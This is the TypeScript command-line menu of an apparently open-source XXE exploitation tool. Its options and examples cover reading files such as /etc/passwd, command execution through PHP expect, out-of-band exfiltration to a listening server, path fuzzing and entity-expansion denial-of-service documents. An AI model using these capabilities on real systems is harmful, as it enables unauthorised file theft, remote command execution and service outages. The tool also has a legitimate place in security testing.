import * as yargs from 'yargs';
import { Encoding, Type, Mode, PayloadGenerator } from './PayloadGenerator';
import * as fs from 'fs';
import { Version } from './Version';
import { Handler } from './Handler';
import { CliUtils } from './CliUtils';



export class Menu {

  public static VERSION = Version.version;

  public static parseOptions(): any {
    const argv = Menu.prepareYargs();
    return Menu.prepareOptions(argv);
  }

  private static prepareOptions(argv: any): any {

    const encoding = argv.e === "phpbase64" ? Encoding.PHP_BASE64 : Encoding.NORMAL;
    const template = argv.t ? fs.readFileSync(argv.t as string).toString().replace(/(\r\n|\n|\r)/gm, "\n") : undefined;
    const commandarg = argv.command || argv.file_to_read || argv.URL || argv.expantions;
    const requestFile = argv.x ? fs.readFileSync(argv.x as string).toString() : undefined;

    let type = Type.file;
    let mode = Mode.XML;

    if (!argv._ || argv._.length !== 1) {
      yargs.showHelp();
      process.exit();
    }

    switch (argv._[0]) { //command
      case 'file': type = Type.file; break;
      case 'expect': type = Type.expect; break;
      case 'request': type = Type.request; break;
      case 'xee': break;
      default: { yargs.showHelp(); process.exit(); }
    }

    const m = (argv.m as string) || "";

    switch (m.toLowerCase()) {
      case 'cdata': mode = Mode.CDATA; break;
      case 'oob': mode = Mode.OOB; break;
      default: mode = Mode.XML; break;
    }


    const address = argv.s as string;
    const port = argv.p as number;

    if (mode !== Mode.XML && !address) {
      CliUtils.printError("You need to specify server address with -s");
    }

    if (argv.verbose)
      Handler.VERBOSE = true;

    return {
      address: address,
      port: port,
      type: type,
      mode: mode,
      encoding: encoding,
      template: template,
      commandarg: commandarg as string,
      xxeIterations: argv.expantions as number,
      requestFile: requestFile,
      output: argv.o,
      fuzz: argv.w ? true : false, //enable fuzz if a wordlist is provided
      fuzzLine: "",
      wordlist: argv.w,
      originalCommandarg: commandarg as string, //with fuzz we are going to change commandarg, we need to keep the original
      successString: argv.y,
      erroString: argv.n,
      requestOutput: argv.X,
      doctype: argv.doctype as string
    };
  }

  private static prepareYargs(): any {

    const argv = yargs

      .usage('\n\nUsage: $0 [command] [options]')

      // .command('file [file_to_read]', 'Use XXE to read a file', (yargs: any) => {
      //   yargs
      //     .positional('file_to_read', {
      //       describe: 'File path to read. Absolute path should start with a /',
      //     });
      // })

      .command('file [file_to_read]', 'Use XXE to do a request', (yargs: any) => {
        yargs
          .positional('file_to_read', {
            describe: 'URL to do the request. FTP and other schemas are allowed as well',
          });
      })

      .command('request [URL]', 'Use XXE to do a request', (yargs: any) => {
        yargs
          .positional('URL', {
            describe: 'URL to do the request. FTP and other schemas are allowed as well',
          });
      })

      .command('expect [command]', 'Use XXE to execute a command through PHP\'s expect', (yargs: any) => {
        yargs
          .positional('command', {
            describe: 'Command to execute through PHP\'s expect',
          });
      })

      .command('xee [expantions]', 'Generate a huge content by resolving entities', (yargs: any) => {
        yargs
          .positional('expantions', {
            describe: 'Limit of entity expantions',
          });
      })

      .alias('s', 'server')
      .nargs('s', 1)
      .describe('s', 'Server address for OOB and DTD')

      .alias('p', 'port')
      .nargs('p', 1)
      .describe('p', 'Server port for OOB and DTDs. Default: 7777')

      .alias('t', 'template')
      .nargs('t', 1)
      .describe('t', 'path to an XML template where to inject payload')

      .alias('m', 'mode')
      .nargs('m', 1)
      .describe('m', 'Extraction Mode: xml, oob, cdata. Default: xml')

      .alias('e', 'encode')
      .nargs('e', 1)
      .describe('e', 'Extraction Encoding: none, phpbase64. Default: none')

      .alias('o', 'output')
      .nargs('o', 1)
      .describe('o', 'Output for the XML payload file. Default is to console')

      .nargs('x', 1)
      .describe('x', 'Use a request to automatically send the xml file')

      .nargs('X', 1)
      .alias('X', "request-output")
      .describe('X', 'Output the response from -x option. If not defined goes to stdout')

      .nargs('verbose', 0)
      .describe('verbose', 'Enable some messages help for understanding whats happening')

      .nargs('doctype', 1)
      .describe('doctype', 'Specify the name of the doctype to be injected. Default is ' + PayloadGenerator.DOCTYPE_NAME)

      .help('h')
      .alias('h', 'help')


      //ADVANCED OPTIONS

      // .group("fuzz", "Fuzzing Specific Options")
      // .alias('f', 'fuzz')
      // .nargs("f", 0)
      // .describe("f", "Enables fuzz options. Use {{FUZZ}} placeholder in the command arg for the magic.")

      .group("wordlist", "Fuzzing Specific Options")
      .nargs("w", 1)
      .alias('w', 'wordlist')
      .describe("w", "Path to a wordlist to be used with the fuzz command. Use {{FUZZ}} placeholder in the command arg for the magic.")

      .group("y", "Fuzzing Specific Options")
      .alias('y', 'success-string')
      .nargs("y", 1)
      .describe("y", "String to search for a success response in the requests. Not usefull for blind attacks")

      .group("n", "Fuzzing Specific Options")
      .alias('n', 'error-string')
      .nargs("n", 1)
      .describe("n", "String to search for an error response in the request. Not usefull for blind attacks")

      // .group("portscan", "Advanced")
      // .nargs("portscan", 1)

      //END ADVANCED OPTIONS


      .example('$0 expect ls', '')
      .example('$0 -s 127.0.0.1 expect ls -e phpbase64 -m oob -o output.xml', '')
      .example('$0 -s 127.0.0.1 file /c/windows/win.ini -t xmltemplate.xml -m oob', '')
      .example('$0 xee 900000000 -o output.xml', '')
      .example('$0 file /etc/passwd -x request.txt -t template.xml', '')
      .example('$0 file /root/{FUZZ} -w wordlist.txt -n "not found" -x request.txt', '')


      .epilog(`Extra Info:
  - When using the xml or cdata modes, add the placeholder '{{XXE}}' in the field where you want the entity content to be injected
  - When specifiying file paths for windows use forward slash.
  - OOB: Out Of Bound: You can use this option to send the data processed by the xml parser, to your local webserver. Usefull with blind attacks
  - When using XML mode, it may break the XML parsing if XML reserved characters are loaded, so you may want to use cdata
  - When using the request option, you can specify the placeholder to inject the payload with {{XXE}} or {{XXE_B64}}
  - When doing fuzz you need to supply a wordlist. You can add the {{FUZZ}} keyword in the main command argument. 
  - You can specify a string to filter successfull requests when fuzzing, either by supplying an expected error string, or an expected success string
  `)
      .wrap(process.stdout.columns)
      .argv;

    return argv;

  }

  public static asciiArt(): string {
    return '\x1b[32m' +
      "    __   ____   ________            _       _ _            \n" +
      "    \\ \\ / /\\ \\ / /  ____|          | |     (_) |           \n" +
      "     \\ V /  \\ V /| |__  __  ___ __ | | ___  _| |_ ___ _ __ \n" +
      "      > <    > < |  __| \\ \\/ / '_ \\| |/ _ \\| | __/ _ \\ '__|\n" +
      "     / . \\  / . \\| |____ >  <| |_) | | (_) | | ||  __/ |   \n" +
      "    /_/ \\_\\/_/ \\_\\______/_/\\_\\ .__/|_|\\___/|_|\\__\\___|_|   \n" +
      "                             | |                           \n" +
      "                             |_|                           \n" +
      '                                    ///////                  \n' +
      '         <<<<<<<                   /:::::/      >>>>>>>      \n' +
      '        <:::::<                   /:::::/        >:::::>     \n' +
      '       <:::::<                   /:::::/          >:::::>    \n' +
      '      <:::::<                   /:::::/            >:::::>   \n' +
      '     <:::::<                   /:::::/              >:::::>  \n' +
      '    <:::::<                   /:::::/                >:::::> \n' +
      '   <:::::<                   /:::::/                  >:::::>\n' +
      '    <:::::<                 /:::::/                  >:::::> \n' +
      '     <:::::<               /:::::/                  >:::::>  \n' +
      '      <:::::<             /:::::/                  >:::::>   \n' +
      '       <:::::<           /:::::/                  >:::::>    \n' +
      '        <:::::<         /:::::/                  >:::::>     \n' +
      '         <<<<<<<       /:::::/                  >>>>>>>      \n' +
      '                      /:::::/                                \n' +
      '                     ///////                                 \n' +
      '                                                             \n' +
      '                      by luisfontes19                        \n' +
      `                       Version ${this.VERSION}               \n` +
      '                                                             \n' +
      '\x1b[0m';
  }
}